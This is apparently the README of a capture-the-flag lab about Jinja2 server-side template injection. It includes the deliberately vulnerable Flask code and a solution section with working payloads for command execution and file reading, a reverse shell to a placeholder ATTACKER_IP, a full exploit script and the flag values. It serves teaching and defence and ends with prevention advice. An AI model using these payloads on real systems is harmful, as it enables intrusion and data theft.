# SSTI Template Generator Challenge

**Status:** ✅ Complete

## Player Description

Create beautiful email templates with EverSec's Email Template Generator! Our innovative system lets YOU control the template syntax directly - we're all about user empowerment! We use Jinja2, a powerful templating engine with lots of fun features like accessing Python objects, running code, and reading files. Some developers are scared of letting users provide template code, but we think that's just gatekeeping. It's not like someone would abuse template syntax to run arbitrary commands on our server. That would require being clever AND malicious, and what are the odds of that?

## Technical Description

**Category:** Web / Template Injection
**Difficulty:** Hard
**Points:** 1300 (350 + 450 + 500)

A Flask-based template generator that demonstrates Server-Side Template Injection (SSTI) vulnerabilities. The application uses Jinja2 templating engine to dynamically generate letters and documents, but fails to properly sanitize user input, allowing attackers to execute arbitrary code on the server.

## Challenge Information

- **Port:** 4006
- **URL:** http://localhost:4006

## Objective

Exploit Server-Side Template Injection to:
1. **FLAG 1** (350 points): Demonstrate SSTI by executing template expressions
2. **FLAG 2** (450 points): Achieve remote code execution (RCE) by reading system files
3. **FLAG 3** (500 points): Escalate to root privileges (advanced)

## Background: What is SSTI?

Server-Side Template Injection (SSTI) occurs when user input is embedded into a template in an unsafe manner. Template engines like Jinja2, Twig, or FreeMarker use special syntax (like `{{ }}` in Jinja2) to evaluate expressions. If an attacker can inject template directives, they can:

- Execute arbitrary code
- Read sensitive files
- Perform remote code execution
- Escalate privileges

## The Vulnerability

### 1. Direct Template Rendering (app.py:42-103)

```python
# VULNERABLE: Using render_template_string with user input
template = f"""
...
<p>{custom_greeting} {name},</p>
<p>{message}</p>
...
"""

rendered = render_template_string(template)
```

User inputs (`custom_greeting`, `name`, `message`) are directly embedded in the template string and then rendered by Jinja2. If a user inputs `{{ 7*7 }}`, Jinja2 will evaluate it to `49`.

### 2. API Endpoint with Full Control (app.py:131-165)

```python
# VULNERABLE: User controls entire template
template_string = data.get('template', '')
rendered = render_template_string(template_string, **variables)
```

The API endpoint allows users to provide the entire template, making exploitation even easier.

## Setup

### Using Docker Compose (Recommended)

From the project root directory:

```bash
docker compose up -d ssti-template-generator
```

The challenge will be available at http://localhost:4006

### Using Docker Directly

From this directory:

```bash
docker build -t ssti-template-generator .
docker run -p 4006:4006 \
  -e FLAG1="sst1_t3mpl4t3_1nj3ct10n" \
  -e FLAG2="c0d3_3x3cut10n_4ch13v3d" \
  -e FLAG3="r00t_pr1v1l3g3_3sc4l4t10n" \
  ssti-template-generator
```

### Local Development

```bash
pip install -r requirements.txt
export FLAG1="sst1_t3mpl4t3_1nj3ct10n"
export FLAG2="c0d3_3x3cut10n_4ch13v3d"
export FLAG3="r00t_pr1v1l3g3_3sc4l4t10n"
python app.py
```

## Solution

<details>
<summary>Click to reveal solution</summary>

### Phase 1: FLAG 1 - Template Injection Detection

#### Step 1: Test for SSTI

Navigate to http://localhost:4006/generator and test basic template expressions:

**Test payload in any field (name, custom_greeting, or message):**
```
{{ 7*7 }}
```

If the output shows `49` instead of `{{ 7*7 }}`, SSTI is confirmed!

**Other detection payloads:**
```
{{ 'test'.upper() }}          → TEST
{{ config }}                   → Shows Flask config
{{ self }}                     → Shows template context
```

#### Step 2: Explore Template Context

Jinja2 provides access to Python objects through the template context:

```
{{ config.items() }}           → List all configuration
{{ request.environ }}          → Environment variables
{{ ''.__class__.__mro__ }}     → Python class hierarchy
```

#### Step 3: Get FLAG 1

Inject a template expression in the notification generator form that proves you can execute code.
FLAG 1 is awarded when your input renders as evaluated output (e.g., `{{7*7}}` renders as `49`).

### Phase 2: FLAG 2 - Remote Code Execution

#### Step 4: Access Built-in Functions

Jinja2 sandboxing can be bypassed by accessing Python's built-in functions through the Method Resolution Order (MRO):

**Basic RCE payload:**
```python
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

This lists all Python classes available. Look for classes that can execute commands like `subprocess.Popen`.

#### Step 5: Find Useful Classes

```python
# Find the index of useful classes
{{ ''.__class__.__mro__[1].__subclasses__()[n] }}

# Common useful classes:
# - subprocess.Popen (for command execution)
# - os._wrap_close (for file operations)
# - warnings.catch_warnings (for accessing functions)
```

#### Step 6: Execute Commands

**Method 1: Using subprocess.Popen**

```python
# Find Popen class (index may vary, typically around 400-500)
{{ ''.__class__.__mro__[1].__subclasses__()[414] }}

# Execute command
{{ ''.__class__.__mro__[1].__subclasses__()[414]('cat /tmp/flags/flag2.txt', shell=True, stdout=-1).communicate()[0].strip() }}
```

**Method 2: Using eval/exec through built-ins**

```python
# Access __builtins__
{{ ''.__class__.__base__.__subclasses__()[n].__init__.__globals__['__builtins__'] }}

# Once you find the right index, execute:
{{ ''.__class__.__base__.__subclasses__()[104].__init__.__globals__['__builtins__']['open']('/tmp/flags/flag2.txt').read() }}
```

**Method 3: Shorter payload using request.application**

```python
{{ request.application.__globals__.__builtins__.open('/tmp/flags/flag2.txt').read() }}
```

**Method 4: Using the API endpoint (easier)**

```bash
curl -X POST http://localhost:4006/api/render \
  -H "Content-Type: application/json" \
  -d '{
    "template": "{{ request.application.__globals__.__builtins__.open(\"/tmp/flags/flag2.txt\").read() }}",
    "variables": {}
  }'
```

#### Step 7: Alternative RCE Methods

**Using config to access werkzeug:**
```python
{{ config.__class__.__init__.__globals__['os'].popen('cat /tmp/flags/flag2.txt').read() }}
```

**Using namespace objects:**
```python
{{ namespace.__init__.__globals__.os.popen('cat /tmp/flags/flag2.txt').read() }}
```

### Phase 3: FLAG 3 - Privilege Escalation (Advanced)

This requires writing a reverse shell or privilege escalation exploit. The flag is in `/tmp/flags/flag3.txt` but may require elevated privileges.

**Reverse shell payload:**
```python
{{ ''.__class__.__mro__[1].__subclasses__()[414]('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1', shell=True) }}
```

### Complete Exploit Script

```python
#!/usr/bin/env python3
import requests
import re

BASE_URL = "http://localhost:4006"

print("=" * 60)
print("SSTI Template Injection Exploit")
print("=" * 60)

# Phase 1: Get FLAG 1
print("\n[Phase 1] Basic SSTI Detection")
print("-" * 60)

response = requests.get(f"{BASE_URL}/flag1")
result = response.json()
print(f"🚩 FLAG 1: {result.get('flag')}")

# Phase 2: RCE to get FLAG 2
print("\n[Phase 2] Remote Code Execution")
print("-" * 60)

# Method 1: Using form injection
rce_payload = "{{ request.application.__globals__.__builtins__.open('/tmp/flags/flag2.txt').read() }}"

form_data = {
    'name': 'Test',
    'company': 'Test Corp',
    'message': rce_payload,
    'custom_greeting': 'Dear'
}

response = requests.post(f"{BASE_URL}/generator", data=form_data)
flag2_match = re.search(r'FLAG\{[^}]+\}', response.text)
if flag2_match:
    print(f"🚩 FLAG 2: {flag2_match.group(0)}")

# Method 2: Using API endpoint (cleaner)
api_payload = {
    "template": "{{ request.application.__globals__.__builtins__.open('/tmp/flags/flag2.txt').read() }}",
    "variables": {}
}

response = requests.post(f"{BASE_URL}/api/render", json=api_payload)
result = response.json()
if result.get('success'):
    rendered = result.get('rendered', '')
    flag2_match = re.search(r'FLAG\{[^}]+\}', rendered)
    if flag2_match:
        print(f"🚩 FLAG 2 (API): {flag2_match.group(0)}")

# Alternative payloads
print("\n[*] Additional RCE payloads to try:")
print("1. {{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}")
print("2. {{ ''.__class__.__mro__[1].__subclasses__() }}")
print("3. {{ request.environ }}")

print("\n" + "=" * 60)
```

### Useful SSTI Payloads

```python
# List all classes
{{ ''.__class__.__mro__[1].__subclasses__() }}

# Read file
{{ request.application.__globals__.__builtins__.open('/etc/passwd').read() }}

# Execute command (find correct Popen index)
{{ ''.__class__.__mro__[1].__subclasses__()[414]('id', shell=True, stdout=-1).communicate() }}

# Environment variables
{{ request.environ }}

# Current app config
{{ config.items() }}

# Import modules
{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('ls').read() }}
```

</details>

## Learning Objectives

After completing this challenge, you should understand:

1. **SSTI Fundamentals**: How template engines process and evaluate expressions
2. **Jinja2 Syntax**: Understanding `{{ }}`, filters, and template context
3. **Python Introspection**: Using `__class__`, `__mro__`, `__subclasses__` for exploitation
4. **Sandbox Bypass**: Techniques to break out of template engine restrictions
5. **RCE via SSTI**: Achieving code execution through template injection
6. **Attack Surface**: Identifying SSTI vulnerabilities in web applications

## Common Pitfalls

1. **Wrong class index**: The index of `subprocess.Popen` varies by Python version
2. **Syntax errors**: Jinja2 template syntax must be valid
3. **Encoding issues**: Some payloads need URL encoding when sent via GET
4. **Output location**: RCE output might not be in the rendered template
5. **Filtering/WAF**: Some applications filter `{{` or `__`

## Hints

> These hints are for CTF administrators helping stuck players. Share them progressively — start with Hint 1.

<details>
<summary>Hint 1</summary>

Submit something like `{{7*7}}` as your template. If the result is `49` rather than the literal text you typed, the server is evaluating your input as a template expression — not just displaying it.

</details>

<details>
<summary>Hint 2</summary>

Jinja2 templates have access to Python's object hierarchy. If you can traverse from a basic object through class inheritance chains, what powerful Python built-ins might eventually be reachable? Research SSTI exploitation in Jinja2.

</details>

<details>
<summary>Hint 3</summary>

You have code execution as the web app user. What categories of privilege escalation would a pentester investigate on a Linux system to move from that user to root?

</details>

## Prevention

### Never Use render_template_string with User Input

```python
# INSECURE
template = f"<p>Hello {user_name}</p>"
return render_template_string(template)

# SECURE - Use template variables
return render_template('template.html', user_name=user_name)
```

### Use Jinja2 Autoescape

```python
# Enable autoescape globally
app = Flask(__name__)
app.jinja_env.autoescape = True

# Or in template
{% autoescape true %}
  {{ user_input }}
{% endautoescape %}
```

### Restrict Template Context

```python
# Limit available objects in template context
from jinja2.sandbox import SandboxedEnvironment

sandbox = SandboxedEnvironment()
template = sandbox.from_string(template_string)
return template.render(limited_context)
```

### Input Validation

```python
# Validate and sanitize user input
import re

def sanitize_template_input(user_input):
    # Remove template syntax
    dangerous_patterns = [
        r'\{\{', r'\}\}', r'\{%', r'%\}',
        r'__', r'\.', r'\[', r'\]'
    ]

    for pattern in dangerous_patterns:
        if re.search(pattern, user_input):
            raise ValueError("Invalid input detected")

    return user_input
```

### General Best Practices

1. **Never use `render_template_string` with user input**
2. **Always use `render_template` with separate template files**
3. **Enable autoescape** in Jinja2 configuration
4. **Use sandboxed environments** when dynamic templates are necessary
5. **Implement strict input validation** with allowlists
6. **Restrict template context** to minimal necessary objects
7. **Regular security audits** of templating code
8. **Monitor for template injection patterns** in logs

## References

- [OWASP SSTI](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)
- [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [Jinja2 Sandbox Security](https://jinja.palletsprojects.com/en/3.1.x/sandbox/)
